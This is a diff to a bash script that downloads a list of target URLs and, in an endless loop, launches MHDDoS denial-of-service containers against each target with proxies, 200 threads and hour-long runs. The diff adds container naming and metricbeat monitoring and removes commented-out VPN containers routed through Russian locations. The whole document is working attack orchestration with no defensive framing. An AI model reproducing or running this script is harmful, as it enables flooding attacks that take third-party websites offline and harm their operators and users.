@@ -2,9 +2,11 @@
 
 proxyFile="proxy1"
 
-while getopts 'f:' flag; do
+while getopts 'f:n:d:' flag; do
   case "${flag}" in
     f) fileName=${OPTARG};;
+    n) hostname=${OPTARG};;
+    d) dropletName=${OPTARG};;
   esac
 done
 
@@ -38,36 +40,44 @@ if [ ! -d "/root/MHDDoS" ]; then
   cd ..
 fi
 
+wget -O metricbeat.docker.yml https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/metricbeat.docker.yml
+
+docker run -d --name=metricbeat \
+  --user=root \
+  --volume="/root/metricbeat.docker.yml:/usr/share/metricbeat/metricbeat.yml:ro" \
+  --volume="/var/run/docker.sock:/var/run/docker.sock:ro" \
+  --volume="/sys/fs/cgroup:/hostfs/sys/fs/cgroup:ro" \
+  --volume="/proc:/hostfs/proc:ro" \
+  --volume="/:/hostfs:ro" \
+  docker.elastic.co/beats/metricbeat:8.1.0 metricbeat -e \
+  -E "name=${hostname}" \
+  -E "tags=["${dropletName}"]"
+
 while :
 do
-
-  # docker run --name vpn1 -e PUID=1000 -e PGID=1000 -e WINDSCRIBE_USERNAME=$windscribeUserName -e WINDSCRIBE_PASSWORD=$windscribePassword -e WINDSCRIBE_LOCATION=RU -e VPN_PORT=8080 -e WINDSCRIBE_FIREWALL=off --dns 8.8.8.8 --cap-add NET_ADMIN --restart unless-stopped -d wiorca/docker-windscribe
-  # docker run --name vpn2 -e PUID=1001 -e PGID=1001 -e WINDSCRIBE_USERNAME=$windscribeUserName -e WINDSCRIBE_PASSWORD=$windscribePassword -e WINDSCRIBE_LOCATION=RU -e VPN_PORT=8080 -e WINDSCRIBE_FIREWALL=off --dns 8.8.8.8 --cap-add NET_ADMIN --restart unless-stopped -d wiorca/docker-windscribe
-  # sleep 1m
 
   wget -O list.txt $fileName
   myarray=(`cat list.txt`)
   noofelements=${#myarray[*]}
   counter=0
-  randVpn="vpn1"
+  sleepTime=61
   while [ $counter -lt $noofelements ]
   do
 
-    if [[ "${myarray[$counter]}" == https* ]]; then
+    dockerName=${myarray[$counter]}
+    dockerName="${dockerName#http://}"
+    dockerName="${dockerName#https://}"
+    dockerName=${dockerName//[:]/_}
+    dockerName=${dockerName%%/*}
 
-        docker run -it --rm -d mhddos_rv EVEN ${myarray[$counter]} 1 300 /app/$proxyFile.txt 200 1600 --debug
-
-        if [ "$randVpn" == "vpn1" ]; then
-            randVpn="vpn2"
-        else
-            randVpn="vpn1"
-        fi
-    fi
+    docker run --name=${dockerName} --label co.elastic.logs/module=docker -it --rm -d mhddos_rv EVEN ${myarray[$counter]} 1 300 /app/$proxyFile.txt 200 3600 --debug
+    sleep 1m
+    sleepTime=$(( $sleepTime - 1 ))
     counter=$(( $counter + 1 ))
   done
 
-  sleep 26m
-
-  docker rm -f $(docker ps -aq) >/dev/null 2>&1 || true
+  if [ $sleepTime -ge 0 ]; then
+    sleep ${sleepTime}m
+  fi
 done
 
